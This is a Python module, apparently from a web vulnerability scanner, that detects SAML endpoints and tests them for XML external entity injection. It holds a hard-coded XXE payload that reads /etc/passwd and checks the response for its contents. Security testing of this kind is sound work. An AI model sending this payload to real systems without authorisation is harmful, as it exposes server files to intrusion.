"""SAML attacks scanner."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse, base64

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    # SAMLResponse tampering: try to access ACS without valid signature
    r = get(url)
    if r.status == 0:
        return findings
    body = r.text or ""
    if "saml" in body.lower() or "samlrequest" in body.lower() or "samlresponse" in body.lower():
        findings.append(Finding(
            id=f"saml-present-{hash(url) & 0xffff:x}",
            target=parsed.netloc,
            type="SAML Endpoint Detected",
            severity="info",
            url=url,
            parameter="saml",
            payload="",
            evidence="SAML-related parameters/content found",
            response_snippet=body[:200],
            confidence=0.7,
        ))
    # XXE via SAML
    xxe_saml = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&xxe;</samlp:Response>"""
    resp = post(url, data=xxe_saml, headers={"Content-Type": "application/xml"})
    if resp.status != 0 and ("root:x:" in (resp.text or "") or "daemon:x:" in (resp.text or "")):
        findings.append(Finding(
            id=f"saml-xxe-{hash(url) & 0xffff:x}",
            target=parsed.netloc,
            type="SAML XXE",
            severity="high",
            url=url,
            parameter="SAMLResponse",
            payload=xxe_saml[:60],
            evidence="File content in response",
            response_snippet=resp.snippet(300),
            confidence=0.85,
        ))
    log_event(parsed.netloc, "saml_scan", {"url": url, "findings": len(findings)})
    return findings
